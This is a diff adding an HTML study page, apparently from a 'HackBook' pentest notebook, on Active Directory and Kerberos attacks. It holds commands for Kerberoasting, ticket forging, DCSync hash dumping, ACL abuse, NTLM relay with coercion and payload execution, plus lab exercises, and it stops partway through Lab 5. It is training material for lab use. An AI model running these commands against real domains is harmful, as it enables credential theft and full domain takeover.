@@ -1,0 +1,1118 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script>
+        (function() {
+        const base = document.createElement('base');
+        if(location.hostname.includes('github.io')){
+          base.href = `/HackBook/`;
+        }else{
+          const pathSegments = window.location.pathname.split('/').filter(element => element !== "");
+          const index = pathSegments.indexOf('HackBook');
+          pathSegments.splice(index + 1, pathSegments.length - (index + 1));
+          base.href = pathSegments.join('/') + '/';
+        }
+        document.head.appendChild(base);
+      })();
+    </script>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <link rel="icon" type="image/x-icon" href="assets/images/hacker.jpg">
+  <title>HackBook | Active Directory</title>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" />
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/prism.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-powershell.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-bash.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-python.min.js"></script>
+  <link rel="stylesheet" href="https://unpkg.com/prism-themes@1.6.0/themes/prism-duotone-sea.css">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+  <script src="assets/scripts/main.js"></script>
+  <link rel="stylesheet" href="assets/styles/styles.css">
+</head>
+<body>
+  <div class="content">
+    <h1>Active Directory &amp; Kerberos</h1>
+    <hr>
+
+    <div class="tab-container">
+      <div class="tab-buttons">
+        <button class="tab-btn active" data-tab="notes">Notes</button>
+        <button class="tab-btn" data-tab="lab">Lab</button>
+        <button class="tab-btn" data-tab="ctf">CTF Challenges</button>
+      </div>
+
+      <!-- ============================================================ -->
+      <!-- NOTES TAB                                                    -->
+      <!-- ============================================================ -->
+      <div class="tab-content active" id="notes">
+
+        <!-- ==================== AD ARCHITECTURE ==================== -->
+        <h2>AD Architecture</h2>
+
+        <table>
+          <tr><th>Concept</th><th>Description</th></tr>
+          <tr><td>Domain</td><td>Logical grouping of objects (users, computers, groups) sharing a common database (NTDS.dit) and policies</td></tr>
+          <tr><td>Domain Controller (DC)</td><td>Server hosting AD DS, NTDS.dit, and handling authentication (Kerberos KDC + LDAP)</td></tr>
+          <tr><td>Forest</td><td>Top-level container — one or more domain trees sharing a common schema, config, and Global Catalog</td></tr>
+          <tr><td>Tree</td><td>Hierarchy of domains sharing a contiguous DNS namespace (e.g., corp.local → sub.corp.local)</td></tr>
+          <tr><td>Trust</td><td>Relationship allowing users in one domain to access resources in another (parent-child, forest, external)</td></tr>
+          <tr><td>Organizational Unit (OU)</td><td>Container for organizing objects within a domain; GPOs are linked to OUs</td></tr>
+          <tr><td>Group Policy (GPO)</td><td>Centralized configuration management applied to OUs, domains, or sites</td></tr>
+          <tr><td>Global Catalog</td><td>Partial read-only copy of all objects in the forest — used for cross-domain searches</td></tr>
+          <tr><td>NTDS.dit</td><td>AD database file (<code>C:\Windows\NTDS\ntds.dit</code>) — stores all AD objects including password hashes</td></tr>
+        </table>
+
+        <h3>Trust Types</h3>
+        <table>
+          <tr><th>Trust Type</th><th>Direction</th><th>Transitivity</th><th>Notes</th></tr>
+          <tr><td>Parent-Child</td><td>Two-way</td><td>Transitive</td><td>Automatic between parent/child domains in a tree</td></tr>
+          <tr><td>Tree-Root</td><td>Two-way</td><td>Transitive</td><td>Automatic between tree roots in a forest</td></tr>
+          <tr><td>Forest</td><td>One or two-way</td><td>Transitive</td><td>Manual, between forest root domains</td></tr>
+          <tr><td>External</td><td>One or two-way</td><td>Non-transitive</td><td>Manual, to a domain in a different forest</td></tr>
+          <tr><td>Shortcut</td><td>One or two-way</td><td>Transitive</td><td>Optimizes auth path within a forest</td></tr>
+        </table>
+
+        <!-- ==================== LDAP ==================== -->
+        <h2>LDAP</h2>
+        <p>AD is an LDAP-compatible directory. Default ports: <strong>389</strong> (LDAP), <strong>636</strong> (LDAPS), <strong>3268</strong> (Global Catalog), <strong>3269</strong> (GC over SSL).</p>
+
+        <h3>Common LDAP Queries</h3>
+<pre><code class="language-bash"># ldapsearch — enumerate all users
+ldapsearch -x -H ldap://DC_IP -D "user@domain.local" -w 'Password123' \
+  -b "DC=domain,DC=local" "(objectClass=user)" sAMAccountName
+
+# Find domain admins
+ldapsearch -x -H ldap://DC_IP -D "user@domain.local" -w 'Password123' \
+  -b "DC=domain,DC=local" "(&(objectClass=group)(cn=Domain Admins))" member
+
+# Find computers
+ldapsearch -x -H ldap://DC_IP -D "user@domain.local" -w 'Password123' \
+  -b "DC=domain,DC=local" "(objectClass=computer)" cn operatingSystem
+
+# Find accounts with SPN set (Kerberoastable)
+ldapsearch -x -H ldap://DC_IP -D "user@domain.local" -w 'Password123' \
+  -b "DC=domain,DC=local" "(&(objectClass=user)(servicePrincipalName=*))" sAMAccountName servicePrincipalName
+
+# Find accounts with pre-auth disabled (AS-REP Roastable)
+ldapsearch -x -H ldap://DC_IP -D "user@domain.local" -w 'Password123' \
+  -b "DC=domain,DC=local" "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" sAMAccountName</code></pre>
+
+        <h3>PowerView LDAP Queries</h3>
+<pre><code class="language-powershell"># Import PowerView
+Import-Module .\PowerView.ps1
+
+# Enumerate domain info
+Get-Domain
+Get-DomainController
+Get-DomainPolicy
+
+# Users
+Get-DomainUser | Select-Object samaccountname, description, memberof
+Get-DomainUser -SPN                          # Kerberoastable accounts
+Get-DomainUser -PreauthNotRequired           # AS-REP Roastable
+
+# Groups
+Get-DomainGroup -Identity "Domain Admins" | Select-Object member
+Get-DomainGroupMember -Identity "Domain Admins" -Recurse
+
+# Computers
+Get-DomainComputer | Select-Object cn, operatingsystem
+
+# OUs and GPOs
+Get-DomainOU | Select-Object name, distinguishedname
+Get-DomainGPO | Select-Object displayname, gpcfilesyspath
+
+# Trusts
+Get-DomainTrust
+Get-ForestTrust</code></pre>
+
+        <!-- ==================== KERBEROS PROTOCOL ==================== -->
+        <h2>Kerberos Protocol</h2>
+
+        <h3>Key Concepts</h3>
+        <table>
+          <tr><th>Term</th><th>Description</th></tr>
+          <tr><td>KDC</td><td>Key Distribution Center — runs on every DC, consists of AS + TGS</td></tr>
+          <tr><td>AS</td><td>Authentication Service — validates identity, issues TGTs</td></tr>
+          <tr><td>TGS</td><td>Ticket Granting Service — issues service tickets</td></tr>
+          <tr><td>TGT</td><td>Ticket Granting Ticket — encrypted with <code>krbtgt</code> hash, proves identity to KDC</td></tr>
+          <tr><td>Service Ticket (ST)</td><td>Ticket for a specific service — encrypted with the service account's hash</td></tr>
+          <tr><td>SPN</td><td>Service Principal Name — unique identifier for a service instance (e.g., <code>MSSQLSvc/sql01.domain.local:1433</code>)</td></tr>
+          <tr><td>PAC</td><td>Privilege Attribute Certificate — embedded in tickets, contains user's group memberships and privileges</td></tr>
+          <tr><td>krbtgt</td><td>Service account for KDC — its NTLM hash encrypts all TGTs in the domain</td></tr>
+        </table>
+
+        <h3>Authentication Flow</h3>
+<pre><code class="language-bash"># Step 1: AS-REQ / AS-REP (get TGT)
+Client → KDC:  AS-REQ { username, timestamp encrypted with user's hash (pre-auth) }
+KDC → Client:  AS-REP { TGT (encrypted with krbtgt hash), session key (encrypted with user's hash) }
+
+# Step 2: TGS-REQ / TGS-REP (get Service Ticket)
+Client → KDC:  TGS-REQ { TGT, SPN of target service, authenticator (encrypted with session key) }
+KDC → Client:  TGS-REP { Service Ticket (encrypted with service account hash), service session key }
+
+# Step 3: AP-REQ (access service)
+Client → Service:  AP-REQ { Service Ticket, authenticator (encrypted with service session key) }
+Service decrypts ticket with its own hash → validates PAC → grants access</code></pre>
+
+<pre><code class="language-bash"># Visual Flow Diagram
+┌────────┐         ┌──────────────────┐         ┌──────────┐
+│ Client │         │   KDC (on DC)    │         │ Service  │
+└───┬────┘         │  ┌────┐ ┌─────┐  │         └────┬─────┘
+    │               │  │ AS │ │ TGS │  │              │
+    │  1. AS-REQ    │  └────┘ └─────┘  │              │
+    │──────────────→│                  │              │
+    │  (user hash   │                  │              │
+    │   pre-auth)   │                  │              │
+    │               │                  │              │
+    │  2. AS-REP    │                  │              │
+    │←──────────────│                  │              │
+    │  (TGT +       │                  │              │
+    │   session key)│                  │              │
+    │               │                  │              │
+    │  3. TGS-REQ   │                  │              │
+    │──────────────→│                  │              │
+    │  (TGT + SPN)  │                  │              │
+    │               │                  │              │
+    │  4. TGS-REP   │                  │              │
+    │←──────────────│                  │              │
+    │  (Service     │                  │              │
+    │   Ticket)     │                  │              │
+    │               │                  │              │
+    │  5. AP-REQ    │                  │              │
+    │──────────────────────────────────────────────→│
+    │  (Service Ticket + Authenticator)             │
+    │                                               │
+    │  6. Access Granted                            │
+    │←──────────────────────────────────────────────│
+    │               │                  │              │</code></pre>
+
+        <!-- ==================== KERBEROASTING ==================== -->
+        <h2>Kerberoasting</h2>
+        <p>Any authenticated domain user can request a service ticket (TGS) for any SPN. The ticket is encrypted with the service account's NTLM hash — crack it offline to recover the password.</p>
+
+        <h3>Attack Steps</h3>
+<pre><code class="language-bash"># 1. Find accounts with SPNs (from Linux)
+impacket-GetUserSPNs domain.local/user:Password123 -dc-ip DC_IP
+
+# 2. Request tickets and save for cracking
+impacket-GetUserSPNs domain.local/user:Password123 -dc-ip DC_IP -request -outputfile kerberoast.txt
+
+# 3. Crack with hashcat (mode 13100 = Kerberoast)
+hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt
+
+# 4. Crack with John
+john kerberoast.txt --wordlist=/usr/share/wordlists/rockyou.txt</code></pre>
+
+<pre><code class="language-powershell"># From Windows — Rubeus
+.\Rubeus.exe kerberoast /outfile:kerberoast.txt
+
+# From Windows — PowerView
+Invoke-Kerberoast -OutputFormat Hashcat | Select-Object Hash | Out-File kerberoast.txt
+
+# Targeted Kerberoast (specific user)
+.\Rubeus.exe kerberoast /user:svc_sql /outfile:svc_sql.txt</code></pre>
+
+        <h3>Detection &amp; Prevention</h3>
+        <table>
+          <tr><th>Detection</th><th>Prevention</th></tr>
+          <tr><td>Event ID 4769 — TGS requests with RC4 encryption (0x17)</td><td>Use Group Managed Service Accounts (gMSA) — 120-char random passwords</td></tr>
+          <tr><td>Honey SPN accounts — monitor for ticket requests</td><td>Enforce AES encryption for service accounts</td></tr>
+          <tr><td>Anomalous volume of TGS requests from a single user</td><td>Long, complex passwords (25+ chars) for service accounts</td></tr>
+        </table>
+
+        <!-- ==================== AS-REP ROASTING ==================== -->
+        <h2>AS-REP Roasting</h2>
+        <p>Accounts with <code>DONT_REQUIRE_PREAUTH</code> set return an AS-REP encrypted with the user's hash without needing a valid pre-authentication timestamp. Crack the AS-REP offline.</p>
+
+<pre><code class="language-bash"># From Linux — find and roast
+impacket-GetNPUsers domain.local/ -dc-ip DC_IP -usersfile users.txt -format hashcat -outputfile asrep.txt
+
+# With valid creds — auto-find vulnerable accounts
+impacket-GetNPUsers domain.local/user:Password123 -dc-ip DC_IP -request -outputfile asrep.txt
+
+# Crack with hashcat (mode 18200)
+hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt</code></pre>
+
+<pre><code class="language-powershell"># From Windows — Rubeus
+.\Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
+
+# PowerView — find vulnerable accounts
+Get-DomainUser -PreauthNotRequired | Select-Object samaccountname</code></pre>
+
+        <!-- ==================== GOLDEN TICKET ==================== -->
+        <h2>Golden Ticket</h2>
+        <p>Forge a TGT using the <code>krbtgt</code> NTLM hash. Grants unrestricted access to any resource in the domain as any user. Persists until the <code>krbtgt</code> password is changed <strong>twice</strong>.</p>
+
+<pre><code class="language-bash"># Prerequisites: krbtgt NTLM hash, domain SID, domain name
+# Typically obtained via DCSync or NTDS.dit extraction
+
+# Impacket — create and use golden ticket
+impacket-ticketer -nthash KRBTGT_HASH -domain-sid S-1-5-21-... -domain domain.local Administrator
+export KRB5CCNAME=Administrator.ccache
+impacket-psexec domain.local/Administrator@dc01.domain.local -k -no-pass</code></pre>
+
+<pre><code class="language-powershell"># Mimikatz — create golden ticket
+kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /krbtgt:KRBTGT_NTLM_HASH /ptt
+
+# Verify
+klist
+dir \\dc01.domain.local\c$</code></pre>
+
+        <!-- ==================== SILVER TICKET ==================== -->
+        <h2>Silver Ticket</h2>
+        <p>Forge a service ticket using the target service account's NTLM hash. Access is limited to that specific service — doesn't touch the KDC (harder to detect).</p>
+
+<pre><code class="language-bash"># Impacket — silver ticket for CIFS (file share)
+impacket-ticketer -nthash SERVICE_HASH -domain-sid S-1-5-21-... \
+  -domain domain.local -spn cifs/target.domain.local Administrator
+export KRB5CCNAME=Administrator.ccache
+impacket-smbclient domain.local/Administrator@target.domain.local -k -no-pass</code></pre>
+
+<pre><code class="language-powershell"># Mimikatz — silver ticket
+kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... \
+  /target:target.domain.local /service:cifs /rc4:SERVICE_NTLM_HASH /ptt</code></pre>
+
+        <table>
+          <tr><th>Service</th><th>SPN Example</th><th>Access Gained</th></tr>
+          <tr><td>CIFS</td><td>cifs/host.domain.local</td><td>File shares (SMB)</td></tr>
+          <tr><td>HTTP</td><td>http/web.domain.local</td><td>Web applications (IIS, ADFS)</td></tr>
+          <tr><td>MSSQL</td><td>MSSQLSvc/sql.domain.local:1433</td><td>SQL Server access</td></tr>
+          <tr><td>LDAP</td><td>ldap/dc.domain.local</td><td>DCSync capabilities</td></tr>
+          <tr><td>HOST</td><td>host/dc.domain.local</td><td>Scheduled tasks, WMI</td></tr>
+        </table>
+
+        <!-- ==================== PASS THE TICKET ==================== -->
+        <h2>Pass-the-Ticket</h2>
+        <p>Extract Kerberos tickets from memory and inject them into another session to impersonate the ticket owner.</p>
+
+<pre><code class="language-powershell"># Mimikatz — export all tickets from memory
+sekurlsa::tickets /export
+
+# Inject a ticket into current session
+kerberos::ptt ticket.kirbi
+
+# Rubeus — dump tickets
+.\Rubeus.exe dump
+.\Rubeus.exe dump /luid:0x3e7 /service:krbtgt
+
+# Rubeus — inject ticket
+.\Rubeus.exe ptt /ticket:base64_ticket_blob</code></pre>
+
+<pre><code class="language-bash"># From Linux — convert .kirbi to .ccache
+impacket-ticketConverter ticket.kirbi ticket.ccache
+export KRB5CCNAME=ticket.ccache
+impacket-psexec domain.local/user@target -k -no-pass</code></pre>
+
+        <!-- ==================== DELEGATION ATTACKS ==================== -->
+        <h2>Delegation Attacks</h2>
+
+        <h3>Unconstrained Delegation</h3>
+        <p>Server stores the user's full TGT in memory. If an admin authenticates to the server, their TGT can be extracted and reused.</p>
+<pre><code class="language-powershell"># Find unconstrained delegation computers (PowerView)
+Get-DomainComputer -Unconstrained | Select-Object cn, dnshostname
+
+# Wait for admin to connect, then dump TGTs (Rubeus)
+.\Rubeus.exe monitor /interval:5 /filteruser:Administrator
+
+# Force authentication via SpoolService (Printer Bug)
+.\SpoolSample.exe dc01.domain.local attacker-server.domain.local</code></pre>
+
+        <h3>Constrained Delegation</h3>
+        <p>Server can impersonate users only to specific services listed in <code>msDS-AllowedToDelegateTo</code>. Abuse S4U2Self + S4U2Proxy to get tickets as any user.</p>
+<pre><code class="language-bash"># Find constrained delegation
+impacket-findDelegation domain.local/user:Password123 -dc-ip DC_IP
+
+# Exploit — get service ticket as admin to the allowed service
+impacket-getST domain.local/svc_web:Password123 -spn cifs/target.domain.local \
+  -impersonate Administrator -dc-ip DC_IP
+export KRB5CCNAME=Administrator@cifs_target.domain.local@DOMAIN.LOCAL.ccache</code></pre>
+
+<pre><code class="language-powershell"># Rubeus — S4U abuse
+.\Rubeus.exe s4u /user:svc_web /rc4:HASH /impersonateuser:Administrator \
+  /msdsspn:cifs/target.domain.local /ptt</code></pre>
+
+        <h3>Resource-Based Constrained Delegation (RBCD)</h3>
+        <p>If you can write to <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> on a target computer, you can configure it to trust a computer account you control for delegation.</p>
+<pre><code class="language-bash"># 1. Create a machine account (or use one you control)
+impacket-addcomputer domain.local/user:Password123 -computer-name FAKE01$ -computer-pass Passw0rd
+
+# 2. Set RBCD — configure target to trust FAKE01$
+impacket-rbcd domain.local/user:Password123 -dc-ip DC_IP \
+  -delegate-from FAKE01$ -delegate-to TARGET$ -action write
+
+# 3. Get service ticket as admin via S4U
+impacket-getST domain.local/FAKE01$:Passw0rd -spn cifs/target.domain.local \
+  -impersonate Administrator -dc-ip DC_IP
+export KRB5CCNAME=Administrator@cifs_target.domain.local@DOMAIN.LOCAL.ccache
+impacket-psexec domain.local/Administrator@target.domain.local -k -no-pass</code></pre>
+
+        <!-- ==================== ACL ABUSE ==================== -->
+        <h2>ACL Abuse</h2>
+        <table>
+          <tr><th>ACE / Right</th><th>Effect</th><th>Exploitation</th></tr>
+          <tr><td>GenericAll</td><td>Full control over the object</td><td>Reset password, modify group membership, set SPN, write RBCD</td></tr>
+          <tr><td>GenericWrite</td><td>Write all properties</td><td>Set SPN (Kerberoast), set logon script, write RBCD</td></tr>
+          <tr><td>WriteDACL</td><td>Modify the object's ACL</td><td>Grant yourself GenericAll, then abuse at will</td></tr>
+          <tr><td>WriteOwner</td><td>Change the object's owner</td><td>Make yourself owner → modify DACL → GenericAll</td></tr>
+          <tr><td>ForceChangePassword</td><td>Reset user's password without knowing current</td><td>Take over the account directly</td></tr>
+          <tr><td>AddMember</td><td>Add members to a group</td><td>Add yourself to Domain Admins</td></tr>
+          <tr><td>DS-Replication-Get-Changes + DS-Replication-Get-Changes-All</td><td>DCSync rights</td><td>Replicate password hashes from DC (DCSync)</td></tr>
+        </table>
+
+<pre><code class="language-powershell"># Enumerate ACLs with PowerView
+Find-InterestingDomainAcl -ResolveGUIDs | Where-Object {
+    $_.IdentityReferenceName -match "youruser"
+}
+
+# Targeted ACL check
+Get-ObjectAcl -Identity "Domain Admins" -ResolveGUIDs | Where-Object {
+    $_.ActiveDirectoryRights -match "GenericAll|WriteDacl|WriteOwner"
+}
+
+# Abuse GenericAll on a user — reset password
+Set-DomainUserPassword -Identity targetuser -AccountPassword (ConvertTo-SecureString 'Newp@ss123!' -AsPlainText -Force)
+
+# Abuse GenericAll on a group — add yourself
+Add-DomainGroupMember -Identity "Domain Admins" -Members "youruser"
+
+# Abuse WriteDACL — grant yourself DCSync rights
+Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" -PrincipalIdentity youruser -Rights DCSync</code></pre>
+
+        <!-- ==================== DCSYNC ==================== -->
+        <h2>DCSync</h2>
+        <p>Mimics domain controller replication to pull password hashes directly from the DC. Requires <code>DS-Replication-Get-Changes</code> + <code>DS-Replication-Get-Changes-All</code> (Domain Admins, Enterprise Admins, or explicitly granted).</p>
+
+<pre><code class="language-bash"># Impacket — dump all hashes
+impacket-secretsdump domain.local/admin:Password123@DC_IP
+
+# Dump specific user
+impacket-secretsdump domain.local/admin:Password123@DC_IP -just-dc-user krbtgt
+
+# Dump using Kerberos auth
+impacket-secretsdump domain.local/admin@DC_IP -k -no-pass</code></pre>
+
+<pre><code class="language-powershell"># Mimikatz
+lsadump::dcsync /domain:domain.local /user:krbtgt
+lsadump::dcsync /domain:domain.local /all /csv</code></pre>
+
+        <!-- ==================== BLOODHOUND ==================== -->
+        <h2>BloodHound</h2>
+        <p>Graph-based AD attack path analysis. Ingests AD data → visualizes relationships → identifies paths to Domain Admin.</p>
+
+<pre><code class="language-bash"># SharpHound (Windows collector)
+.\SharpHound.exe -c All
+.\SharpHound.exe -c All --ldapusername user --ldappassword Password123
+
+# BloodHound.py (Linux collector)
+bloodhound-python -u user -p 'Password123' -d domain.local -ns DC_IP -c All
+
+# Start neo4j + BloodHound
+sudo neo4j start
+bloodhound</code></pre>
+
+        <h3>Common Attack Paths (Cypher Queries)</h3>
+<pre><code class="language-bash"># Shortest path to Domain Admin
+MATCH p=shortestPath((n {owned:true})-[*1..]->(m:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"})) RETURN p
+
+# Kerberoastable users with path to DA
+MATCH (u:User {hasspn:true}) MATCH p=shortestPath((u)-[*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"})) RETURN p
+
+# Users with DCSync rights
+MATCH p=(n)-[:GetChanges|GetChangesAll*1..]->(d:Domain) RETURN p
+
+# Find computers with unconstrained delegation
+MATCH (c:Computer {unconstraineddelegation:true}) RETURN c.name</code></pre>
+
+        <!-- ==================== NTLM RELAY ==================== -->
+        <h2>NTLM Relay</h2>
+        <p>Capture NTLM authentication attempts and relay them to other services to authenticate as the victim.</p>
+
+<pre><code class="language-bash"># 1. Start Responder (capture/relay LLMNR/NBT-NS/mDNS)
+sudo responder -I eth0 -dwPv
+
+# 2. Start ntlmrelayx — relay to target (e.g., SMB, LDAP, MSSQL)
+impacket-ntlmrelayx -t smb://TARGET_IP -smb2support
+impacket-ntlmrelayx -t ldap://DC_IP --escalate-user youruser  # grant DCSync rights
+impacket-ntlmrelayx -t smb://TARGET_IP -e payload.exe         # execute payload
+
+# Relay to multiple targets
+impacket-ntlmrelayx -tf targets.txt -smb2support
+
+# Check for SMB signing (required to be disabled for SMB relay)
+crackmapexec smb TARGET_RANGE --gen-relay-list relay_targets.txt</code></pre>
+
+        <h3>Coercion Techniques (Force Authentication)</h3>
+<pre><code class="language-bash"># PetitPotam — coerce DC to authenticate via EFSRPC
+python3 PetitPotam.py LISTENER_IP DC_IP
+
+# PrinterBug / SpoolSample — coerce via Print Spooler
+python3 printerbug.py domain.local/user:Password123@DC_IP LISTENER_IP
+
+# Coercer — automated coercion testing
+python3 coercer.py -u user -p Password123 -d domain.local -t DC_IP -l LISTENER_IP</code></pre>
+
+        <!-- ==================== ENUMERATION TOOLS ==================== -->
+        <h2>Enumeration Tools Cheatsheet</h2>
+        <table>
+          <tr><th>Tool</th><th>Platform</th><th>Key Commands</th></tr>
+          <tr><td>PowerView</td><td>Windows</td><td><code>Get-DomainUser</code>, <code>Get-DomainGroup</code>, <code>Find-InterestingDomainAcl</code></td></tr>
+          <tr><td>BloodHound / SharpHound</td><td>Both</td><td><code>SharpHound.exe -c All</code>, <code>bloodhound-python -c All</code></td></tr>
+          <tr><td>ldapdomaindump</td><td>Linux</td><td><code>ldapdomaindump -u 'domain\user' -p pass DC_IP</code></td></tr>
+          <tr><td>enum4linux-ng</td><td>Linux</td><td><code>enum4linux-ng -A DC_IP -u user -p pass</code></td></tr>
+          <tr><td>CrackMapExec / NetExec</td><td>Linux</td><td><code>nxc smb DC_IP -u user -p pass --users</code></td></tr>
+          <tr><td>Rubeus</td><td>Windows</td><td><code>Rubeus.exe kerberoast</code>, <code>Rubeus.exe asreproast</code></td></tr>
+          <tr><td>Mimikatz</td><td>Windows</td><td><code>sekurlsa::logonpasswords</code>, <code>lsadump::dcsync</code></td></tr>
+          <tr><td>Impacket</td><td>Linux</td><td><code>secretsdump</code>, <code>GetUserSPNs</code>, <code>psexec</code>, <code>wmiexec</code></td></tr>
+        </table>
+
+<pre><code class="language-bash"># CrackMapExec / NetExec — quick enumeration
+nxc smb DC_IP -u user -p 'Password123' --users      # list users
+nxc smb DC_IP -u user -p 'Password123' --groups      # list groups
+nxc smb DC_IP -u user -p 'Password123' --shares      # list shares
+nxc smb DC_IP -u user -p 'Password123' --pass-pol    # password policy
+nxc smb RANGE -u user -p 'Password123' --sam          # dump SAM hashes
+nxc smb DC_IP -u user -p 'Password123' -M spider_plus # spider all shares</code></pre>
+
+      </div>
+
+      <!-- ============================================================ -->
+      <!-- LAB TAB                                                      -->
+      <!-- ============================================================ -->
+      <div class="tab-content" id="lab">
+        <h2>Labs</h2>
+
+        <div class="lab-card">
+          <h4>Lab 1: AD Enumeration with PowerView</h4>
+          <span class="difficulty difficulty-easy">Easy</span>
+          <p class="objective">Objective: Enumerate domain users, groups, ACLs, trusts, and SPNs using PowerView in a lab AD environment.</p>
+          <div class="setup-code">
+<pre><code class="language-powershell"># Setup: Domain-joined Windows machine with PowerView.ps1
+
+# 1. Import PowerView (bypass execution policy if needed)
+Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
+Import-Module .\PowerView.ps1
+
+# 2. Enumerate basic domain info
+Get-Domain
+Get-DomainController | Select-Object Name, IPAddress, OSVersion</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>List all domain users and identify any with descriptions containing passwords</li>
+              <li>Find all members of the "Domain Admins" group (recursively)</li>
+              <li>Identify accounts with SPNs set (<code>Get-DomainUser -SPN</code>)</li>
+              <li>Find accounts that don't require Kerberos pre-authentication</li>
+              <li>Enumerate all domain trusts and their types</li>
+              <li>Use <code>Find-InterestingDomainAcl</code> to find exploitable ACLs for your current user</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 2: Kerberoasting</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Objective: Identify a Kerberoastable service account, request its TGS ticket, and crack it offline to obtain the service password.</p>
+          <div class="setup-code">
+<pre><code class="language-bash"># From Linux with Impacket
+# 1. Discover accounts with SPNs
+impacket-GetUserSPNs domain.local/lowpriv_user:Password123 -dc-ip 10.10.10.10
+
+# 2. Request tickets
+impacket-GetUserSPNs domain.local/lowpriv_user:Password123 -dc-ip 10.10.10.10 \
+  -request -outputfile kerberoast_hashes.txt
+
+# 3. Examine the hash format
+cat kerberoast_hashes.txt</code></pre>
+<pre><code class="language-powershell"># From Windows with Rubeus
+.\Rubeus.exe kerberoast /stats                    # survey Kerberoastable accounts
+.\Rubeus.exe kerberoast /outfile:hashes.txt       # request all tickets</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Enumerate all user accounts with SPNs — note the service type and encryption</li>
+              <li>Request TGS tickets using both Impacket and Rubeus</li>
+              <li>Crack the ticket with hashcat (<code>hashcat -m 13100</code>) or John</li>
+              <li>Use the cracked password to access the service account's resources</li>
+              <li>Discuss: why are RC4-encrypted tickets easier to crack than AES?</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 3: ACL Abuse Chain</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Objective: Chain multiple ACL misconfigurations to escalate from a low-privilege user to Domain Admin.</p>
+          <div class="setup-code">
+<pre><code class="language-powershell"># Scenario:
+# User "webadmin" has GenericWrite on user "svc_backup"
+# User "svc_backup" has ForceChangePassword on user "itadmin"
+# User "itadmin" is a member of "Account Operators"
+# "Account Operators" has GenericAll on the "Domain Admins" group
+
+# Step 1: Enumerate your permissions
+Import-Module .\PowerView.ps1
+$sid = (Get-DomainUser webadmin).objectsid
+Get-DomainObjectAcl -Identity svc_backup -ResolveGUIDs | Where-Object {
+    $_.SecurityIdentifier -eq $sid
+}</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Map the full ACL chain from your user to Domain Admins using PowerView or BloodHound</li>
+              <li>Abuse GenericWrite on svc_backup — set a targeted Kerberoast SPN or modify logon script</li>
+              <li>Use ForceChangePassword to take over itadmin</li>
+              <li>As itadmin (Account Operators), abuse GenericAll on Domain Admins to add yourself</li>
+              <li>Verify Domain Admin access: <code>dir \\dc01\c$</code></li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 4: DCSync Attack</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Objective: Obtain DCSync privileges and extract the krbtgt hash to forge a Golden Ticket.</p>
+          <div class="setup-code">
+<pre><code class="language-bash"># Scenario: You have compromised a user with WriteDACL on the domain object
+# Goal: Grant yourself DCSync rights → dump krbtgt → forge Golden Ticket
+
+# Step 1: Verify current access — DCSync should fail
+impacket-secretsdump domain.local/youruser:Password123@DC_IP -just-dc-user krbtgt
+# Expected: ACCESS_DENIED</code></pre>
+<pre><code class="language-powershell"># Step 2: Grant DCSync rights via WriteDACL
+Import-Module .\PowerView.ps1
+Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" -PrincipalIdentity youruser -Rights DCSync</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Confirm you have WriteDACL on the domain root by querying ACLs</li>
+              <li>Grant your user the replication rights needed for DCSync</li>
+              <li>Execute DCSync with <code>impacket-secretsdump</code> or <code>mimikatz lsadump::dcsync</code></li>
+              <li>Extract the <code>krbtgt</code> NTLM hash</li>
+              <li>Forge a Golden Ticket and access the Domain Controller: <code>dir \\dc01\c$</code></li>
+              <li>Clean up: remove the DCSync ACE you added</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 5: BloodHound Data Collection and Analysis</h4>
+          <span class="difficulty difficulty-easy">Easy</span>
+          <p class="objective">Objective: Collect AD data with SharpHound/bloodhound-python, import into BloodHound, and identify attack paths to Domain Admin.</p>
+          <div class="setup-code">
+<pre><code class="language-bash"># From Linux — bloodhound-python
+bloodhound-python -u lowpriv -p 'Password123' -d corp.local -ns 10.10.10.10 -c All
+# Outputs: computers.json, users.json, groups.json, domains.json, etc.
+
+# Upload to BloodHound (neo4j must be running)
+# Import all JSON files via the BloodHound GUI upload button</code></pre>
+<pre><code class="language-powershell"># From Windows — SharpHound
+.\SharpHound.exe -c All --zipfilename bloodhound_data.zip
+
+# Stealth collection (no noisy LDAP queries)
+.\SharpHound.exe -c DCOnly
+
+# Targeted collection
